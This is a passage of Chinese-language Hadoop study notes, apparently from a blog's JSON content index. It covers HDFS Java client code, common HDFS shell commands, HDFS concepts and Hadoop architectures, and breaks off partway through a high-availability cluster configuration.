FileSystem 的几种方式第一种方式获取 FileSystem import org.apache.commons.io.IOUtils;import org.apache.hadoop.conf.Configuration;import org.apache.hadoop.fs.*;import org.testng.annotations.Test;import java.io.*;import java.net.URI;import java.net.URISyntaxException;public class HdfsOperateStudy { /** * 通过 fileSystem 获取分布式文件系统的几种方式 */ //获取 hdfs 分布式文件系统的第一种方式 @Test public void getFileSystem1() throws IOException { //如果 configuration 不做任何配置，获取到的是本地文件系统 Configuration configuration = new Configuration(); //覆盖我们的 hdfs 的配置，得到我们的分布式文件系统 configuration.set(\"fs.defaultFS\",\"hdfs://node01:8020/\"); FileSystem fileSystem = FileSystem.get(configuration); System.out.println(fileSystem.toString()); }} 第二种方式获取 FileSystem /*** 获取 hdfs 分布式文件系统的第二种方式*/@Testpublic void getHdfs2() throws URISyntaxException, IOException { //使用两个参数来获取 hdfs 文件系统 //第一个参数是一个 URI，定义了我们使用 hdfs://这种方式来访问，就是分布式文件系统 FileSystem fileSystem = FileSystem.get(new URI(\"hdfs://node01:8020\"), new Configuration()); System.out.println(fileSystem.toString());} 第三种方式获取 FileSystem /*** 获取 hdfs 分布式文件系统的第三种方式*/@Testpublic void getHdfs3() throws IOException { Configuration configuration = new Configuration(); configuration.set(\"fs.defaultFS\",\"hdfs://node01:8020\"); FileSystem fileSystem = FileSystem.newInstance(configuration); System.out.println(fileSystem.toString());} 第四种方式获取 FileSystem /*** 获取 hdfs 分布式文件系统的第四种方式*/@Testpublic void getHdfs4() throws Exception { //使用两个参数来获取 hdfs 文件系统 //第一个参数是一个 URI，定义了我们使用 hdfs://这种方式来访问， 就是分布式文件系统 FileSystem fileSystem = FileSystem.newInstance(new URI(\"hdfs://node01:8020\"), new Configuration()); System.out.println(fileSystem.toString());} hdfs 上面创建文件夹/*** hdfs 上面创建文件夹*/@Testpublic void createHdfsDir() throws Exception{ //获取分布式文件系统的客户端对象 FileSystem fileSystem = FileSystem.get(new URI(\"hdfs://node01:8020\"), new Configuration()); fileSystem.mkdirs(new Path(\"/abc/bbc/ddd\")); fileSystem.close();} hdfs 的文件上传/*** hdfs 的文件上传*/@Testpublic void uploadFileToHdfs() throws Exception{ //获取分布式文件系统的客户端 FileSystem fileSystem = FileSystem.get(new URI(\"hdfs://node01:8020\"), new Configuration()); //通过 copyFromLocalFile 将我们的本地文件上传到 hdfs 上面去 fileSystem.copyFromLocalFile(false,new Path(\"file:///f:\\\\平凡的世界.txt\"),new Path(\"/abc/bbc/ddd\")); fileSystem.close();} 遍历 hdfs 上面所有的文件//遍历 hdfs 上面所有的文件@Testpublic void listHdfsFiles() throws Exception{ FileSystem fileSystem = FileSystem.get(new URI(\"hdfs://node01:8020\"), new Configuration()); Path path = new Path(\"/\"); //alt + shift + l 提取变量 RemoteIterator&lt;LocatedFileStatus&gt; locatedFileStatusRemoteIterator = fileSystem.listFiles(path, true); //遍历迭代器，获取我们的迭代器里面每一个元素 while (locatedFileStatusRemoteIterator.hasNext()){ LocatedFileStatus next = locatedFileStatusRemoteIterator.next(); Path path1 = next.getPath(); System.out.println(path1.toString()); } fileSystem.close();}"},{"title":"","date":"2019-09-19T08:36:00.000Z","updated":"2022-05-11T02:50:00.000Z","comments":true,"path":"notes/Hadoop/hdfs-shell.html","permalink":"https://blog.mhuig.top/notes/Hadoop/hdfs-shell","excerpt":"","text":"HDFS 命令行 大数据处理技术 - HDFS 的命令行使用 hdfs 常用的操作命令查看根路径下面的文件或者文件夹 hdfs dfs -ls / 查看 test 路径下面的文件或者文件夹 hdfs dfs -ls /test 递归的查看根路径下面的文件或者文件夹 hdfs dfs -ls -R / 在 hdfs 上面递归的创建文件夹 hdfs dfs -mkdir -p /aaa/bbb hdfs dfs -moveFromLocal sourceDir (本地磁盘的文件或者文件夹的路径) destDir（hdfs 的路径） hdfs dfs -moveFromLocal /root/install.log / hdfs dfs -mv hdfsSourceDir hdfsDestDir hdfs dfs -mv /install.log /aaa hdfs dfs -put localDir hdfsDir 将本地文件系统的文件或者文件夹放到 hdfs 上面去 hdfs dfs -put /root/install.log.syslog /aaa hdfs dfs -cat hdfsDir 查看 hdfs 的文件内容 hdfs dfs -cat /aaa/install.log hdfs dfs -cp hdfsSourceDIr hdfsDestDir 拷贝文件或者文件夹 hdfs dfs -cp /aaa/install.log /aaa/in2.loghdfs dfs -ls /aaa hdfs dfs -rmr （递归）删除文件或者文件夹 hdfs dfs -rmr /aaa/in2.log hdfs 的权限管理命令： hdfs dfs -chmod -R 777 /xxx hdfs 的安全模式安全模式是 HDFS 所处的一种特殊状态, 在这种状态下，文件系统只接受读数据请求，而不接受删除、修改等变更请求。 在 NameNode 主节点启动时，HDFS 首先进入安全模式，DataNode 在启动的时候会向 namenode 汇报可用的 block 等状态，当整个系统达到安全标准时，HDFS 自动离开安全模式。 如果 HDFS 出于安全模式下，则文件 block 不能进行任何的副本复制操作，因此达到最小的副本数量要求是基于 datanode 启动时的状态来判定的，启动时不会再做任何复制（从而达到最小副本数量要求），hdfs 集群刚启动的时候，默认 30S 钟的时间是出于安全期的，只有过了 30S 之后，集群脱离了安全期，然后才可以对集群进行操作. hdfs dfsadmin -safemode"},{"title":"","date":"2019-09-19T08:35:00.000Z","updated":"2022-05-11T02:33:00.000Z","comments":true,"path":"notes/Hadoop/hdfs.html","permalink":"https://blog.mhuig.top/notes/Hadoop/hdfs","excerpt":"","text":"HDFS 大数据处理技术 - HDFS 入门介绍 HDFS 介绍HDFS 是 Hadoop Distribute File System 的简称，意为：Hadoop 分布式文件系统。是 Hadoop 核心组件之一，作为最底层的分布式存储服务而存在。分布式文件系统解决的问题就是大数据存储。它们是横跨在多台计算机上的存储系统。分布式文件系统在大数据时代有着广泛的应用前景，它们为存储和处理超大规模数据提供所需的扩展能力。 HDFS 的特性首先，它是一个文件系统，用于存储文件，通过统一的命名空间目录树来定位文件; 其次，它是分布式的，由很多服务器联合起来实现其功能，集群中的服务器有各自的角色。 master / slave 架构HDFS 采用 master/slave 架构。一般一个 HDFS 集群是有一个 Namenode 和一定数目的 Datanode 组成。Namenode 是 HDFS 集群主节点，Datanode 是 HDFS 集群从节点，两种角色各司其职，共同协调完成分布式的文件存储服务。 分块存储HDFS 中的文件在物理上是分块存储（block）的，块的大小可以通过配置参数来规定，默认大小在 hadoop2.x 版本中是 128M。 名字空间（NameSpace）HDFS 支持传统的层次型文件组织结构。用户或者应用程序可以创建目录，然后将文件保存在这些目录里。文件系统名字空间的层次结构和大多数现有的文件系统类似：用户可以创建、删除、移动或重命名文件。Namenode 负责维护文件系统的名字空间，任何对文件系统名字空间或属性的修改都将被 Namenode 记录下来。HDFS 会给客户端提供一个统一的抽象目录树，客户端通过路径来访问文件，形如： hdfs://namenode:port/dir-a/dir-b/dir-c/file.data。 Namenode 元数据管理我们把目录结构及文件分块位置信息叫做元数据。Namenode 负责维护整个 hdfs 文件系统的目录树结构，以及每一个文件所对应的 block 块信息（block 的id，及所在的 datanode 服务器）。 元数据信息：描述数据的数据第一个问题：如果有一堆书，如何快速查找到我需要的时平凡的世界 书本的分类，书本的编号，书本所在的书架，书本的位置，如果记录了这些信息，就可以快速找到对应的书本这些信息，描述了我们需要的书本在哪里，确定了这些描述信息，就可以唯一定位到这本书如何区分关羽与王熙凤：性别，外观样貌信息（丹凤眼） 长头发，短头发，都是通过一些描述信息，来区分每一个人的如何设计一个文件系统：第一个：盘符第二个：文件名第三个：文件的类型第四个：文件大小第五个：创建时间修改时间第六个：所属权限第七个：文件的路径这些数据都是用于描述一个文件或者文件夹，只要有了这些描述信息，那么我们就能定位到一个唯一的文件或者文件夹这些都是一些描述数据，叫做我们的元数据信息元数据信息：文件名称，文件路径，文件的大小，文件的权限每一个文件或者每一个文件夹都会产生一份元数据信息只要抓住了元数据信息，就抓住了磁盘上面存储的所有的文件或者文件夹 Datanode 数据存储文件的各个 block 的具体存储管理由 datanode 节点承担。每一个 block 都可以在多个 datanode 上。Datanode 需要定时向 Namenode 汇报自己持有的 block 信息。 存储多个副本（副本数量也可以通过参数设置 dfs.replication，默认是 3）。 副本机制为了容错，文件的所有 block 都会有副本。每个文件的 block 大小和副本系数都是可配置的。应用程序可以指定某个文件的副本数目。副本系数可以在文件创建的时候指定，也可以在之后改变。 一次写入，多次读出HDFS 是设计成适应一次写入，多次读出的场景，且不支持文件的修改。正因为如此，HDFS 适合用来做大数据分析的底层存储服务，并不适合用来做网盘等应用，因为，修改不方便，延迟大，网络开销大，成本太高。 分布式文件系统详细介绍在 hadoop 当中，分布式文件系统 HDFS，对文件系统有一个抽象，HDFS属于当中的一个实现类，也就是说分布式文件系统类似于一个接口，定义了标准，下面有很多的实现类其中 HDFS 是一个子实现类而已，但是现在很多人都只知道一种就是 HDFS 的实现，并没有了解过其他的实现类其实分布式文件系统的实现有很多种，具体详细参见《hadoop 权威指南第三版》第 59 页 我们重点突出讲解 HDFS 这种文件系统 HDFS 分布式文件系统设计目标 1、 硬件错误 由于集群很多时候由数量众多的廉价机组成，使得硬件错误成为常态（磁盘损坏 屌丝机） 2、 数据流访问 所有应用以流的方式访问数据，设置之初便是为了用于批量的处理数据，而不是低延时的实时交互处理 3、 大数据集 典型的 HDFS 集群上面的一个文件是以 G 或者 T 数量级的，支持一个集群当中的文件数量达到千万数量级 4、 简单的相关模型 假定文件是一次写入，多次读取的操作（假设 不会频繁写） 5、 移动计算比移动数据便宜 一个应用请求的计算，离它操作的数据越近，就越高效（代码到数据） 6、 多种软硬件的可移植性 HDFS 的来源HDFS 起源于 Google 的 GFS 论文（GFS，Mapreduce，BigTable 为 google 的旧的三驾马车）发表于 2003 年 10 月HDFS 是 GFS 的克隆版 Hadoop Distributed File system易于扩展的分布式文件系统, 运行在大量普通廉价机器上，提供容错机制为大量用户提供性能不错的文件存取服务."},{"title":"","date":"2019-09-19T03:24:00.000Z","updated":"2022-05-10T02:57:00.000Z","comments":true,"path":"notes/Hadoop/hdoop-arch.html","permalink":"https://blog.mhuig.top/notes/Hadoop/hdoop-arch","excerpt":"","text":"架构模型 大数据处理技术 - hadoop 的架构模型（1.x，2.x 的各种架构模型介绍） 1.x 的版本架构模型 文件系统核心模块NameNode：集群当中的主节点，主要用于管理集群当中的各种数据 secondaryNameNode：主要能用于 hadoop 当中元数据信息的辅助管理 DataNode：集群当中的从节点，主要用于存储集群当中的各种数据 数据计算核心模块JobTracker：接收用户的计算请求任务，并分配任务给从节点 TaskTracker：负责执行主节点 JobTracker 分配的任务 2.x 的版本架构模型第一种：NameNode 与 ResourceManager 单节点架构模型 文件系统核心模块NameNode：集群当中的主节点，主要用于管理集群当中的各种数据 secondaryNameNode：主要能用于 hadoop 当中元数据信息的辅助管理 DataNode：集群当中的从节点，主要用于存储集群当中的各种数据 数据计算核心模块ResourceManager：接收用户的计算请求任务，并负责集群的资源分配 NodeManager：负责执行主节点 APPmaster 分配的任务 第二种：NameNode 单节点与 ResourceManager 高可用架构模型 文件系统核心模块NameNode：集群当中的主节点，主要用于管理集群当中的各种数据 secondaryNameNode：主要能用于 hadoop 当中元数据信息的辅助管理 DataNode：集群当中的从节点，主要用于存储集群当中的各种数据 数据计算核心模块ResourceManager：接收用户的计算请求任务，并负责集群的资源分配，以及计算任务的划分，通过 zookeeper 实现 ResourceManager 的高可用 NodeManager：负责执行主节点 ResourceManager 分配的任务 第三种：NameNode 高可用与 ResourceManager 单节点架构模型 文件系统核心模块NameNode：集群当中的主节点，主要用于管理集群当中的各种数据，其中 nameNode 可以有两个，形成高可用状态 DataNode：集群当中的从节点，主要用于存储集群当中的各种数据 JournalNode：文件系统元数据信息管理 数据计算核心模块ResourceManager：接收用户的计算请求任务，并负责集群的资源分配，以及计算任务的划分 NodeManager：负责执行主节点 ResourceManager 分配的任务 第四种：NameNode 与 ResourceManager 高可用架构模型 文件系统核心模块NameNode：集群当中的主节点，主要用于管理集群当中的各种数据，一般都是使用两个，实现 HA 高可用 JournalNode：元数据信息管理进程，一般都是奇数个 DataNode：从节点，用于数据的存储 数据计算核心模块ResourceManager：Yarn 平台的主节点，主要用于接收各种任务，通过两个，构建成高可用 NodeManager：Yarn 平台的从节点，主要用于处理 ResourceManager 分配的任务"},{"title":"","date":"2019-09-19T08:32:00.000Z","updated":"2022-05-11T01:16:00.000Z","comments":true,"path":"notes/Hadoop/high-availability.html","permalink":"https://blog.mhuig.top/notes/Hadoop/high-availability","excerpt":"","text":"高可用分布式 大数据处理技术 - apache hadoop 三种架构介绍 (高可用分布式环境介绍以及安装) 高可用分布式环境搭建（适用于工作当中正式环境搭建） 实现 namenode 高可用，ResourceManager 的高可用 集群运行服务规划 服务器 IP 192.168.52.100 192.168.52.110 192.168.52.120 zookeeper zk zk zk HDFS JournalNode JournalNode JournalNode NameNode NameNode ZKFC ZKFC DataNode DataNode DataNode YARN ResourceManager ResourceManager NodeManager NodeManager NodeManager MapReduce JobHistoryServer 安装包解压停止之前的 hadoop 集群的所有服务，并删除所有机器的 hadoop 安装包，第一台机器执行以下命令 cd /export/servers/hadoop-2.7.5sbin/stop-dfs.shsbin/stop-yarn.shsbin/mr-jobhistory-daemon.sh stop historyserver cd /export/servers/rm -rf hadoop-2.7.5/ 然后重新解压 hadoop 压缩包解压压缩包第一台机器执行以下命令进行解压 cd /export/softwarestar -zxvf hadoop-2.7.5.tar.gz -C ../servers/ 配置文件的修改修改 core-site.xml第一台机器执行以下命令 cd /export/servers/hadoop-2.7.5/etc/hadoopvim core-site.xml core-site.xml&lt;configuration&gt; &lt;!-- 指定 NameNode 的 HA 高可用的 zk 地址 --&gt; &lt;property&gt; &lt;name&gt;ha.zookeeper.quorum&lt;/name&gt; &lt;value&gt;node01:2181,node02:2181,node03:2181&lt;/value&gt; &lt;/property&gt; &lt;!-- 指定 HDFS 访问的域名地址 --&gt; &lt;property&gt; &lt;name&gt;fs.defaultFS&lt;/name&gt; &lt;value&gt;hdfs://ns&lt;/value&gt; &lt;/property&gt; &lt;!-- 临时文件存储目录 --&gt; &lt;property&gt; &lt;name&gt;hadoop.tmp.dir&lt;/name&gt; &lt;value&gt;/export/servers/hadoop-2.7.5/data/tmp&lt;/value&gt; &lt;/property&gt; &lt;!-- 开启 hdfs 垃圾箱机制，指定垃圾箱中的文件七天之后就彻底删掉单位为分钟--&gt; &lt;property&gt; &lt;name&gt;fs.trash.interval&lt;/name&gt; &lt;value&gt;10080&lt;/value&gt; &lt;/property&gt;&lt;/configuration&gt; 修改 hdfs-site.xml第一台机器执行以下命令 cd /export/servers/hadoop-2.7.5/etc/hadoopvim hdfs-site.xml hdfs-site.xml&lt;configuration&gt; &lt;!-- 指定命名空间 --&gt; &lt;property&gt; &lt;name&gt;dfs.nameservices&lt;/name&gt; &lt;value&gt;ns&lt;/value&gt; &lt;/property&gt; &lt;!-- 指定该命名空间下的两个机器作为我们的 NameNode --&gt; &lt;property&gt; &lt;name&gt;dfs.ha.namenodes.ns&lt;/name&gt; &lt;value&gt;nn1,nn2&lt;/value&gt; &lt;/property&gt; &lt;!-- 配置第一台服务器的 namenode 通信地址 --&gt; &lt;property&gt; &lt;name&gt;dfs.namenode.rpc-address.ns.nn1&lt;/name&gt; &lt;value&gt;node01:8020&lt;/value&gt; &lt;/property&gt; &lt;!-- 配置第二台服务器的 namenode 通信地址 --&gt; &lt;property&gt; &lt;name&gt;dfs.namenode.rpc-address.ns.nn2&lt;/name&gt; &lt;value&gt;node02:8020&lt;/value&gt; &lt;/property&gt; &lt;!-- 所有从节点之间相互通信端口地址 --&gt; &lt;property&gt; &lt;name&gt;dfs.namenode.servicerpc-address.ns.nn1&lt;/name&gt; &lt;value&gt;node01:8022&lt;/value&gt; &lt;/property&gt; &lt;!-- 所有从节点之间相互通信端口地址 --&gt; &lt;property&gt; &lt;name&gt;dfs.namenode.servicerpc-address.ns.nn2&lt;/name&gt; &lt;value&gt;node02:8022&lt;/value&gt; &lt;/property&gt; &lt;!-- 第一台服务器 namenode 的 web 访问地址 --&gt; &lt;property&gt; &lt;name&gt;dfs.namenode.http-address.ns.nn1&lt;/name&gt; &lt;value&gt;node01:50070&lt;/value&gt; &lt;/property&gt; &lt;!-- 第二台服务器 namenode 的 web 访问地址 --&gt; &lt;property&gt; &lt;name&gt;dfs.namenode.http-address.ns.nn2&lt;/name&gt; &lt;value&gt;node02:50070&lt;/value&gt; &lt;/property&gt; &lt;!-- journalNode 的访问地址，注意这个地址一定要配置 --&gt; &lt;property&gt; &lt;name&gt;dfs.namenode.shared.edits.dir&lt;/name&gt; &lt;value&gt;qjournal://node01:8485;node02:8485;node03:8485/ns1&lt;/value&gt; &lt;/property&gt; &lt;!-- 指定故障自动恢复使用的哪个 java 类 --&gt; &lt;property&gt; &lt;name&gt;dfs.client.failover.proxy.provider.ns&lt;/name&gt; &lt;value&gt;org.apache.hadoop.hdfs.server.namenode.ha.ConfiguredFailoverProxyProvider&lt;/value&gt; &lt;/property&gt; &lt;!-- 故障转移使用的哪种通信机制 --&gt; &lt;property&gt; &lt;name&gt;dfs.ha.fencing.methods&lt;/name&gt; &lt;value&gt;sshfence&lt;/value&gt; &lt;/property&gt; &lt;!-- 指定通信使用的公钥 --&gt; &lt;property&gt; &lt;name&gt;dfs.ha.fencing.ssh.private-key-files&lt;/name&gt; &lt;value&gt;/root/.ssh/id_rsa&lt;/value&gt; &lt;/property&gt; &lt;!-- journalNode 数据存放地址 --&gt; &lt;property&gt; &lt;name&gt;dfs.journalnode.edits.dir&lt;/name&gt; &lt;value&gt;/export/servers/hadoop-2.7.5/data/dfs/jn&lt;/value&gt; &lt;/property&gt; &lt;!-- 启用自动故障恢复功能 --&gt; &lt;property&gt; &lt;name&gt;dfs.ha.automatic-failover.enabled&lt;/name&gt; &lt;value&gt;true&lt;/value&gt; &lt;/property&gt; &lt;!-- namenode 产生的文件存放路径 --&gt; &lt;property&gt; &lt;name&gt;dfs.namenode.name.dir&lt;/name&gt; &lt;value&gt;file:///export/servers/hadoop-2.7.5/data/dfs/nn/name&lt;/value&gt; &lt;/property&gt; &lt;!-- edits 产生的文件存放路径 --&gt; &lt;property&gt; &lt;name&gt;dfs.namenode.edits.dir&lt;/name&gt; &lt;value&gt;file:///export/servers/hadoop-2.7.5/data/dfs/nn/edits&lt;/value&gt; &lt;/property&gt; &lt;!-- dataNode 文件存放路径 --&gt; &lt;property&gt; &lt;name&gt;dfs.datanode.data.dir&lt;/name&gt; &lt;value&gt;file:///export/servers/hadoop-2.7.5/data/dfs/dn&lt;/value&gt; &lt;/property&gt; &lt;!-- 关闭 hdfs 的文件权限 --&gt; &lt;property&gt; &lt;name&gt;dfs.permissions&lt;/name&gt; &lt;value&gt;false&lt;/value&gt; &lt;/property&gt; &lt;!-- 指定 block 文件块的大小 --&gt; &lt;property&gt; &lt;name&gt;dfs.blocksize&lt;/name&gt; &lt;value&gt;134217728&lt;/value&gt; &lt;/property&gt;&lt;/configuration&gt; 修改 yarn-site.xml注意 node03 与 node02 配置不同 第一台机器执行以下命令 cd /export/servers/hadoop-2.7.5/etc/hadoopvim yarn-site.xml yarn-site.xml&lt;configuration&gt; &lt;!-- Site specific YARN configuration properties --&gt; &lt;!-- 是否启用日志聚合.应用程序完成后,日志汇总收集每个容器的日志,这些日志移动到文件系统,例如 HDFS. --&gt; &lt;!-- 用 户 可 以 通 过 配 置 \"yarn.nodemanager.remote-app-log-dir\" 、\"yarn.nodemanager.remote-app-log-dir-suffix\"来确定日志移动到的位置 --&gt; &lt;!-- 用户可以通过应用程序时间服务器访问日志 --&gt; &lt;!-- 启用日志聚合功能，应用程序完成后，收集各个节点的日志到一起便于查看 --&gt; &lt;property&gt; &lt;name&gt;yarn.log-aggregation-enable&lt;/name&gt; &lt;value&gt;true&lt;/value&gt; &lt;/property&gt; &lt;!--开启 resource manager HA,默认为 false--&gt; &lt;property&gt; &lt;name&gt;yarn.resourcemanager.ha.enabled&lt;/name&gt; &lt;value&gt;true&lt;/value&gt; &lt;/property&gt; &lt;!-- 集群的 Id，使用该值确保 RM 不会做为其它集群的 active --&gt; &lt;property&gt; &lt;name&gt;yarn.resourcemanager.cluster-id&lt;/name&gt; &lt;value&gt;mycluster&lt;/value&gt; &lt;/property&gt; &lt;!--配置 resource manager 命名--&gt; &lt;property&gt; &lt;name&gt;yarn.resourcemanager.ha.rm-ids&lt;/name&gt; &lt;value&gt;rm1,rm2&lt;/value&gt; &lt;/property&gt; &lt;!-- 配置第一台机器的 resourceManager --&gt; &lt;property&gt; &lt;name&gt;yarn.resourcemanager.hostname.rm1&lt;/name&gt; &lt;value&gt;node03&lt;/value&gt; &lt;/property&gt; &lt;!-- 配置第二台机器的 resourceManager --&gt; &lt;property&gt; &lt;name&gt;yarn.resourcemanager.hostname.rm2&lt;/name&gt; &lt;value&gt;node02&lt;/value&gt; &lt;/property&gt; &lt;!-- 配置第一台机器的 resourceManager 通信地址 --&gt; &lt;property&gt; &lt;name&gt;yarn.resourcemanager.address.rm1&lt;/name&gt; &lt;value&gt;node03:8032&lt;/value&gt; &lt;/property&gt; &lt;property&gt; &lt;name&gt;yarn.resourcemanager.scheduler.address.rm1&lt;/name&gt; &lt;value&gt;node03:8030&lt;/value&gt; &lt;/property&gt; &lt;property&gt; &lt;name&gt;yarn.resourcemanager.resourcetracker.address.rm1&lt;/name&gt; &lt;value&gt;node03:8031&lt;/value&gt; &lt;/property&gt; &lt;property&gt; &lt;name&gt;yarn.resourcemanager.admin.address.rm1&lt;/name&gt; &lt;value&gt;node03:8033&lt;/value&gt; &lt;/property&gt; &lt;property&gt; &lt;name&gt;yarn.resourcemanager.webapp.address.rm1&lt;/name&gt; &lt;value&gt;node03:8088&lt;/value&gt; &lt;/property&gt; &lt;!-- 配置第二台机器的 resourceManager 通信地址 --&gt; &lt;property&gt; &lt;name&gt;yarn.resourcemanager.address.rm2&lt;/name&gt; &lt;value&gt;node02:8032&lt;/value&gt; &lt;/property&gt; &lt;property&gt; &lt;name&gt;yarn.resourcemanager.scheduler.address.rm2&lt;/name&gt; &lt;value&gt;node02:8030&lt;/value&gt; &lt;/property&gt; &lt;property&gt; &lt;name&gt;yarn.resourcemanager.resourcetracker.address.rm2&lt;/name&gt; &lt;value&gt;node02:8031&lt;/value&gt; &lt;/property&gt; &lt;property&gt; &lt;name&gt;yarn.resourcemanager.admin.address.rm2&lt;/name&gt; &lt;value&gt;node02:8033&lt;/value&gt; &lt;/property&gt; &lt;property&gt; &lt;name&gt;yarn.resourcemanager.webapp.address.rm2&lt;/name&gt; &lt;value&gt;node02:8088&lt;/value&gt; &lt;/property&gt; &lt;!--开启 resourcemanager 自动恢复功能--&gt; &lt;property&gt; &lt;name&gt;yarn.resourcemanager.recovery.enabled&lt;/name&gt; &lt;value&gt;true&lt;/value&gt; &lt;/property&gt; &lt;!--在 node1 上配置 rm1,在 node2 上配置 rm2,注意：一般都喜欢把配置好的文件远程复制到其它机器上，但这个在 YARN 的另一个机器上一定要修改，其他机器上不配置此项--&gt; &lt;property&gt; &lt;name&gt;yarn.resourcemanager.ha.id&lt;/name&gt; &lt;value&gt;rm1&lt;/value&gt; &lt;description&gt;If we want to launch more than one RM in single node,we need this configuration&lt;/description&gt; &lt;/property&gt; &lt;!--用于持久存储的类。尝试开启--&gt; &lt;property&gt; &lt;name&gt;yarn.resourcemanager.store.class&lt;/name&gt; &lt;value&gt;org.apache.hadoop.yarn.server.resourcemanager.recovery.ZKRMStateStore&lt;/value&gt; &lt;/property&gt; &lt;property&gt; &lt;name&gt;yarn.resourcemanager.zk-address&lt;/name&gt; &lt;value&gt;node01:2181,node02:2181,node03:2181&lt;/value&gt; &lt;description&gt;For multiple zk services, separate them with comma&lt;/description&gt; &lt;/property&gt; &lt;!--开启 resourcemanager 故障自动切换，指定机器--&gt; &lt;property&gt; &lt;name&gt;yarn.resourcemanager.ha.automaticfailover.enabled&lt;/name&gt; &lt;value&gt;true&lt;/value&gt; &lt;description&gt;Enable automatic failover; By default, it is enabled only when HA is enabled.&lt;/description&gt; &lt;/property&gt; &lt;property&gt; &lt;name&gt;yarn.client.failover-proxy-provider&lt;/name&gt; &lt;value&gt;org.apache.hadoop.yarn.client.ConfiguredRMFailoverProxyProvider&lt;/value&gt; &lt;/property&gt; &lt;!-- 允许分配给一个任务最大的 CPU 核数，默认是 8 --&gt; &lt;property&gt; &lt;name&gt;yarn.nodemanager.resource.cpu-vcores&lt;/name&gt; &lt;value&gt;4&lt;/value&gt; &lt;/property&gt; &lt;!-- 每个节点可用内存,单位 MB --&gt; &lt;property&gt; &lt;name&gt;yarn.nodemanager.resource.memory-mb&lt;/name&gt; &lt;value&gt;512&lt;/value&gt; &lt;/property&gt; &lt;!-- 单个任务可申请最少内存，默认 1024MB --&gt; &lt;property&gt; &lt;name&gt;yarn.scheduler.minimum-allocation-mb&lt;/name&gt; &lt;value&gt;512&lt;/value&gt; &lt;/property&gt; &lt;!-- 单个任务可申请最大内存，默认 8192MB --&gt; &lt;property&gt; &lt;name&gt;yarn.scheduler.maximum-allocation-mb&lt;/name&gt; &lt;value&gt;512&lt;/value&gt; &lt;/property&gt; &lt;!--多长时间聚合删除一次日志 此处--&gt; &lt;property&gt; &lt;name&gt;yarn.log-aggregation.retain-seconds&lt;/name&gt; &lt;value&gt;2592000&lt;/value&gt;&lt;!--30 day--&gt; &lt;/property&gt; &lt;!--时间在几秒钟内保留用户日志。只适用于如果日志聚合是禁用的--&gt; &lt;property&gt; &lt;name&gt;yarn.nodemanager.log.retain-seconds&lt;/name&gt; &lt;value&gt;604800&lt;/value&gt;&lt;!--7 day--&gt; &lt;/property&gt; &lt;!--指定文件压缩类型用于压缩汇总日志--&gt; &lt;property&gt; &lt;name&gt;yarn.nodemanager.log-aggregation.compressiontype&lt;/name&gt; &lt;value&gt;gz&lt;/value&gt; &lt;/property&gt; &lt;!-- nodemanager 本地文件存储目录--&gt; &lt;property&gt; &lt;name&gt;yarn.nodemanager.local-dirs&lt;/name&gt; &lt;value&gt;/export/servers/hadoop-2.7.5/yarn/local&lt;/value&gt; &lt;/property&gt; &lt;!-- resourceManager 保存最大的任务完成个数 --&gt; &lt;property&gt; &lt;name&gt;yarn.resourcemanager.max-completed-applications&lt;/name&gt; &lt;value&gt;1000&lt;/value&gt; &lt;/property&gt; &lt;!-- 逗号隔开的服务列表，列表名称应该只包含 a-zA-Z0-9_,不能以数字开 始--&gt; &lt;property&gt; &lt;name&gt;yarn.nodemanager.aux-services&lt;/name&gt; &lt;value&gt;mapreduce_shuffle&lt;/value&gt; &lt;/property&gt; &lt;!--rm 失联后重新链接的时间--&gt; &lt;property&gt; &lt;name&gt;yarn.resourcemanager.connect.retry-interval.ms&lt;/name&gt; &lt;value&gt;2000&lt;/value&gt; &lt;/property&gt;&lt;/configuration&gt; 修改 mapred-site.xmlcd /export/servers/hadoop-2.7.5/etc/hadoopvim mapred-site.xml mapred-site.xml&lt;configuration&gt; &lt;!--指定运行 mapreduce 的环境是 yarn --&gt; &lt;property&gt; &lt;name&gt;mapreduce.framework.name&lt;/name&gt; &lt;value&gt;yarn&lt;/value&gt; &lt;/property&gt; &lt;!-- MapReduce JobHistory Server IPC host:port --&gt; &lt;property&gt; &lt;name&gt;mapreduce.jobhistory.address&lt;/name&gt; &lt;value&gt;node03:10020&lt;/value&gt; &lt;/property&gt; &lt;!-- MapReduce JobHistory Server Web UI host:port --&gt; &lt;property&gt; &lt;name&gt;mapreduce.jobhistory.webapp.address&lt;/name&gt; &lt;value&gt;node03:19888&lt;/value&gt; &lt;/property&gt; &lt;!-- The directory where MapReduce stores control files. 默 认 ${hadoop.tmp.dir}/mapred/system --&gt; &lt;property&gt; &lt;name&gt;mapreduce.jobtracker.system.dir&lt;/name&gt; &lt;value&gt;/export/servers/hadoop2.7.5/data/system/jobtracker&lt;/value&gt; &lt;/property&gt; &lt;!-- The amount of memory to request from the scheduler for each map task. 默认 1024--&gt; &lt;property&gt; &lt;name&gt;mapreduce.map.memory.mb&lt;/name&gt; &lt;value&gt;1024&lt;/value&gt; &lt;/property&gt; &lt;!-- &lt;property&gt; &lt;name&gt;mapreduce.map.java.opts&lt;/name&gt; &lt;value&gt;-Xmx1024m&lt;/value&gt; &lt;/property&gt; --&gt; &lt;!-- The amount of memory to request from the scheduler for each reduce task. 默认 1024--&gt; &lt;property&gt; &lt;name&gt;mapreduce.reduce.memory.mb&lt;/name&gt; &lt;value&gt;1024&lt;/value&gt; &lt;/property&gt; &lt;!-- &lt;property&gt; &lt;name&gt;mapreduce.reduce.java.opts&lt;/name&gt; &lt;value&gt;-Xmx2048m&lt;/value&gt; &lt;/property&gt; --&gt; &lt;!-- 用于存储文件的缓存内存的总数量，以兆字节为单位。默认情况下， 分配给每个合并流 1MB，给个合并流应该寻求最小化。默认值 100--&gt; &lt;property&gt; &lt;name&gt;mapreduce.task.io.sort.mb&lt;/name&gt; &lt;value&gt;100&lt;/value&gt; &lt;/property&gt; &lt;!-- &lt;property&gt; &lt;name&gt;mapreduce.jobtracker.handler.count&lt;/name&gt; &lt;value&gt;25&lt;/value&gt; &lt;/property&gt;--&gt; &lt;!-- 整理文件时用于合并的流的数量。这决定了打开的文件句柄的数量。 默认值 10--&gt; &lt;property&gt; &lt;name&gt;mapreduce.task.io.sort.factor&lt;/name&gt; &lt;value&gt;10&lt;/value&gt; &lt;/property&gt; &lt;!-- 默认的并行传输量由 reduce 在 copy(shuffle)阶段。默认值 5--&gt; &lt;property&gt; &lt;name&gt;mapreduce.reduce.shuffle.parallelcopies&lt;/name&gt; &lt;value&gt;25&lt;/value&gt; &lt;/property&gt; &lt;property&gt; &lt;name&gt;yarn.app.mapreduce.am.command-opts&lt;/name&gt; &lt;value&gt;-Xmx1024m&lt;/value&gt; &lt;/property&gt; &lt;!-- MR AppMaster 所需的内存总量。默认值 